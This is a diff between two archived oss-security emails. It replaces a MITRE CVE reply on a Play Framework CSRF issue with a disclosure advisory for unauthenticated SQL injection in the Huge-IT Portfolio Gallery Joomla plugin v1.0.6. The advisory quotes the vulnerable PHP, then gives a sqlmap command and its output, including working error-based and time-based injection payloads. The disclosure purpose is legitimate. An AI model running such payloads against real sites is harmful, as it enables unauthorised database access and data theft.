@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2407" "Friday" "15" "July" "2016" "07:54:41" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20160715115441.2B51D6C4292@smtpvmsrv1.mitre.org>" "53" "[oss-security] Re: CVE request for the Play Framework" nil nil nil "7" "2016071511:54:41" "[oss-security] Re: CVE request for the Play Framework" (number mark "U       cve-assign@m Jul 15   53/2407  " thread-indent "\"[oss-security] Re: CVE request for the Play Framework\"\n") "<CAAYo3BupQw4M1Ct5nO4UVC87TmQatCdcxbmZpaiyckMb8ws4sQ@mail.gmail.com>" ("<CAAYo3BupQw4M1Ct5nO4UVC87TmQatCdcxbmZpaiyckMb8ws4sQ@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2897" "Friday" "23" "September" "2016" "03:50:33" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<02DB2C41-3186-45AD-9FC9-639FE9B256C0@me.com>" "68" "[oss-security] Unauthenticated SQL Injection in Huge-IT Portfolio Gallery" nil nil nil "9" "2016092307:50:33" "[oss-security] Unauthenticated SQL Injection in Huge-IT Portfolio Gallery" (number mark "U       larry0@me.co Sep 23   68/2897  " thread-indent "\"[oss-security] Unauthenticated SQL Injection in Huge-IT Portfolio Gallery\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 22243 invoked by uid 550); 15 Jul 2016 11:54:53 -0000
+Received: (qmail 30427 invoked by uid 550); 23 Sep 2016 07:50:55 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,65 +12,98 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 22221 invoked from network); 15 Jul 2016 11:54:53 -0000
-From: cve-assign@mitre.org
-To: dblack@atlassian.com
-Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
-In-Reply-To: <CAAYo3BupQw4M1Ct5nO4UVC87TmQatCdcxbmZpaiyckMb8ws4sQ@mail.gmail.com>
-Message-Id: <20160715115441.2B51D6C4292@smtpvmsrv1.mitre.org>
-Date: Fri, 15 Jul 2016 07:54:41 -0400 (EDT)
-Subject: [oss-security] Re: CVE request for the Play Framework
+Received: (qmail 30296 invoked from network); 23 Sep 2016 07:50:50 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
+	t=1474617038; bh=Uc9JQqPKl4g3ebL+/bUsyfeIDNMxw5hsUv+qDCCefZQ=;
+	h=Subject:From:Content-type:Message-id:Date:To:MIME-version;
+	b=EsRfXJut/1siX8ihYp2sLc+HRmsimP2k7SX2dBX9gsrEiYwmPqqiV1TKOUv3IixFb
+ AzB0imreSyVYTW2cfRwYluLqlm5abMDXdY9HYha+KApQuDVnZ2zgFiSoLDxbrgm7DQ
+ aFLgCrrfaKykTceMLHqUkI20RQdrPfsyPV6k7qtEzSzHw7cnlsjqL55EJnUluSEV7E
+ EEqdUTWm4iGk6a/cYX+ykfeggXR+AUkK/T2xs23QFIi2Imb9a+iHZstrLUnSwfU3SY
+ 5oa03+0a6mffwvx1IAwWFg5dsImBgfaPFw25ygbG+Xwc0Brj9P4zyD8cPBRMoMF8ae
+ yHN9LVlMAHsQA==
+X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
+ definitions=2016-09-23_04:,, signatures=0
+X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
+ clxscore=1034 suspectscore=1 malwarescore=0 phishscore=0 adultscore=0
+ bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
+ engine=8.0.1-1603290000 definitions=main-1609230142
+From: "Larry W. Cashdollar" <larry0@me.com>
+Content-type: multipart/alternative;
+ boundary=Apple-Mail-C5F20AE1-0226-4C55-9C41-AAB490ECC129
+X-Mailer: iPad Mail (13G36)
+Message-id: <02DB2C41-3186-45AD-9FC9-639FE9B256C0@me.com>
+Date: Fri, 23 Sep 2016 03:50:33 -0400
+To: oss-security@lists.openwall.com
+Content-transfer-encoding: 7bit
+MIME-version: 1.0 (1.0)
+Subject: [oss-security] Unauthenticated SQL Injection in Huge-IT Portfolio Gallery
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+--Apple-Mail-C5F20AE1-0226-4C55-9C41-AAB490ECC129
+Content-Type: text/plain;
+	charset=us-ascii
+Content-Transfer-Encoding: quoted-printable
 
-> In version 2.5.0 of the Play Framework a CSRF bypass that depends upon
-> an implementation bug in chrome's beacon api was fixed.
 
-We think additional information would help in deciding whether this is
-commonly recognized as a Play Framework vulnerability (which would
-have a CVE ID) or Play Framework security hardening (which would not
-have a CVE ID). Our understanding thus far is:
+Title: Unauthenticated SQL Injection in Huge-IT Portfolio Gallery Plugin v1=
+.0.6
+Author: Larry W. Cashdollar, @_larry0
+Date: 2016-09-16
+Download Site: http://huge-it.com/joomla-portfolio-gallery/
+Vendor: huge-it.com, fixed v1.0.7
+Vendor Notified: 2016-09-17
+Vendor Contact: info@huge-it.com
+Description: Huge-IT Portfolio Gallery extension can do wonders with your w=
+ebsite. If you wish to show your photos, videos, enclosing the additional i=
+mages and videos, then this Portfolio Gallery extension is what you need.
+Vulnerability:
+The following lines allow unauthenticated users to perform SQL injection ag=
+ainst the functions in ajax_url.php: In file ajax_url.php: 11 define('_JEXE=
+C',1); 12 defined('_JEXEC') or die('Restircted access'); . . . 49 $page =3D=
+ $_POST["page"]; 50 $num=3D$_POST['perpage']; 51 $start =3D $page * $num - =
+$num; 52 $idofgallery=3D$_POST['galleryid']; 53 $level =3D $_POST['level'];=
+ 54 $query =3D $db->getQuery(true); 55 $query->select('*'); 56 $query->from=
+('#__huge_itportfolio_images'); 57 $query->where('portfolio_id =3D'.$idofga=
+llery); 58 $query ->order('#__huge_itportfolio_images.ordering asc'); 59 $d=
+b->setQuery($query,$start,$num);
+CVE-2016-1000124
 
-  - Play Framework is not an Atlassian product
+Exploit Code:
+$ sqlmap -u 'http://example.com/components/com_portfoliogallery/ajax_url.ph=
+p' --data=3D"page=3D1&galleryid=3D*&post=3Dhuge_it_portfolio_gallery_ajax&p=
+erpage=3D20&linkbutton=3D2" --level=3D5 --risk=3D3
+=20
+=20
+(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing th=
+e others (if any)? [y/N]
+sqlmap identified the following injection point(s) with a total of 2870 HTT=
+P(s) requests:
+---
+Parameter: #1* ((custom) POST)
+ Type: error-based
+ Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
+ Payload: page=3D1&galleryid=3D-2264 OR 1 GROUP BY CONCAT(0x71716a7a71,(SEL=
+ECT (CASE WHEN (3883=3D3883) THEN 1 ELSE 0 END)),0x7178627071,FLOOR(RAND(0)=
+*2)) HAVING MIN(0)#&post=3Dhuge_it_portfolio_gallery_ajax&perpage=3D20&link=
+button=3D2
+=20
+ Type: AND/OR time-based blind
+ Title: MySQL >=3D 5.0.12 time-based blind - Parameter replace
+ Payload: page=3D1&galleryid=3D(CASE WHEN (9445=3D9445) THEN SLEEP(5) ELSE =
+9445 END)&post=3Dhuge_it_portfolio_gallery_ajax&perpage=3D20&linkbutton=3D2
+---
+[13:30:39] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 8.0 (jessie)
+web application technology: Apache 2.4.10
+back-end DBMS: MySQL >=3D 5.0.12
+[13:30:39] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 2715 times
+[13:30:39] [INFO] fetched data logged to text files under '/home/larry/.sql=
+map/output/192.168.0.4'
+=20
+[*] shutting down at 13:30:39
 
-  - https://github.com/playframework/playframework/pull/5527#discussion-diff-51786858
-    says "In order to make Play's CSRF filter more resilient to
-    browser plugin vulnerabilities and new extensions, the default
-    configuration for the CSRF filter has been made far more
-    conservative."
+Advisory: http://www.vapidlabs.com/advisory.php?v=3D170
 
-  - Chromium issue 490015 has some debate about whether it is a
-    Chrome/Chromium vulnerability, e.g., "The issue is whether it's
-    the browser responsibility to act as a nanny to weak websites, or
-    we should leave weak websites as sacrifice for great justice."
-    versus "To be clear, this is a security bug ... There is a
-    security bug in Chrome, but no action is being done."
 
-Typically, it would be best not to have a CVE for Play Framework if
-the essence of the Play Framework problem is "the product did not
-proactively add workarounds for all browser-level vulnerabilities that
-might be discovered later."
-
-- -- 
-CVE Assignment Team
-M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-[ A PGP key is available for encrypted communications at
-  http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iQIcBAEBCAAGBQJXiM35AAoJEHb/MwWLVhi2loIP/jPajrxasGvKZoI0KtBapJAR
-QgeiNrem6Va0JL+j5AoTAXNWLhLCl5/geXn7GJuCGP2dt3MDKAMCQEnj2zhhjTha
-FHmxzVfqOUAt3JsNZ7cium+pn6bKMybwrTQYW2YO2Vald+0JWm74QbYBLU+ZLZTn
-CgSROeAwtpDvqislJLksajGn6U19L6U+S08uRWOHqEHFoeatF4xBhQySAeThvDop
-QcxY0xaAnFNvv8RvYg0F6xaVcrylrkWmAmnFMt50RtfiJUXHMfzintK8ypypjQzr
-DMF5So2QIbUht/fha5dpK7q3Yms3BnZ1kT2VRoCZGBFx3pY6cJ2YpdfddD4e9jdb
-oOaOSK7gr7nUo4D8g/jeSHfhA1smrshrVi4dFFwFHXbj5xiF3dACzOmUBHBQ4hi6
-B9RyrihdXpt1rsMAC8t3BitgaIou6yyrDRINb2hlu3OWiUFiUPNOJ314eTJWlNv9
-TJcmqCM6hxM7L4/MWQp8GF+xCDpxnIWDTjrUUGbmFY1IjAIHOsXR3ctzwVdln2Sg
-6ptiUPFn0hztEv1mPUVbJ/a4egATHjftNnznXNuzEdHxqwc49RwbgChsdDhkD2Kr
-s990pECojFG9W22C4Ke32hXikhZfGSTuhpW06zks/dfbzxNbxPp21axAnG0uNI8i
-G5NoAaXXknSzpZ/e5Dx3
-=RxGV
------END PGP SIGNATURE-----
+--Apple-Mail-C5F20AE1-0226-4C55-9C41-AAB490ECC129--
